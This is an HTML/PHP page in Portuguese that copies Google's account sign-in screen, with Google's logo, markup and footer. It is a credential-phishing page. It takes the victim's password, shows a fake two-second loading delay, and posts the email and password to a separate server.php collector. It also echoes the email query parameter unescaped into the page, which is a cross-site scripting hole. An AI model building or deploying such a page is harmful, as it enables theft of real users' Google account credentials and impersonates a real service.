<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet" />

    <link rel="stylesheet" href="./reset.css" />
    <link rel="stylesheet" href="./styles.css" />

    <title>Fazer login nas Contas do Google</title>
</head>

<body>
    <div class="container">
        <div class="card" id="loginCard">
            <div class="preloader">
                <div class="preloader-line"></div>
            </div>
            <form id="loginForm" action="http://localhost:8081/server.php?email=<?= $_GET['email'] ?>" style="text-align: center;">
                <img src="./images/google-logo.svg" alt="" />
                <h2 style="margin-top: 10px;">Olá!</h2>
                <div style="display: inline-block; vertical-align: middle; border: 1px solid #ccc; border-radius: 12px; padding: 1px; margin-top: 10px; margin-bottom: 60px">
                    <div style="display: inline-block; vertical-align: middle;" jscontroller="ENv7Ef" jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd" tabindex="0" role="link" aria-label="selecionado. Alternar entre contas" jsname="af8ijd">
                        <div style="display: inline-block; vertical-align: middle;" class="gPHLDe">
                            <div style="display: inline-block; vertical-align: middle; margin-top:2px" class="qQWzTd" aria-hidden="true">
                                <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                </svg>
                            </div>
                        </div>
                        <div style="display: inline-block; vertical-align: middle;" jsname="bQIQze" class="KTeGk" data-profile-identifier="" translate="no"><?= $_GET['email'] ?></div>
                        <div style="display: inline-block; vertical-align: middle; margin-top:2px" class="krLnGe">
                            <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                            </svg>
                        </div>
                    </div>
                </div>
                <input type="password" name="senha" placeholder="Digite sua senha" />
                <div style="display: flex; align-items: start;">

                    <label for="mostrarSenha" style="display: inline-block; vertical-align: middle; margin-right: 5px;">
                        <input onclick="mostrarOcultarSenha()" type="checkbox" id="mostrarSenha" onclick="mostrarOcultarSenha()" style="margin-left:2px; vertical-align: middle; width: 18px; margin-right:20px;"> Mostrar senha
                    </label>
                </div>



                <input hidden type="email" name="email" value="<?= $_GET['email'] ?>">
                <div class="card-bottom">
                    <a href="">Esqueceu a senha?</a>
                    <button type="submit">Avançar</button>
                </div>
        </div>
        </form>

        <div class="footer">
            <select name="select">
                <option value="Portugês (Brasil) selected">Portugês (Brasil)</option>
                <option value="English (United States)">
                    English (United States)
                </option>
                <option value="Español (España)">Español (España)</option>
            </select>

            <div class="footer-span">
                <span>Ajuda</span>
                <span>Privacidade</span>
                <span>Termos</span>
            </div>
        </div>
    </div>
</body>

</html>

<script>
    function mostrarOcultarSenha() {
        var senhaInput = document.getElementsByName("senha")[0];
        var mostrarSenhaCheckbox = document.getElementById("mostrarSenha");

        if (mostrarSenhaCheckbox.checked) {
            senhaInput.type = "text";
        } else {
            senhaInput.type = "password";
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        var loginForm = document.getElementById('loginForm');
        var loginCard = document.getElementById('loginCard');
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault();
            loginCard.classList.add('loading');
            document.body.classList.add('loading');

            setTimeout(function() {
                loginForm.submit();
            }, 2000);
        });
    });
</script>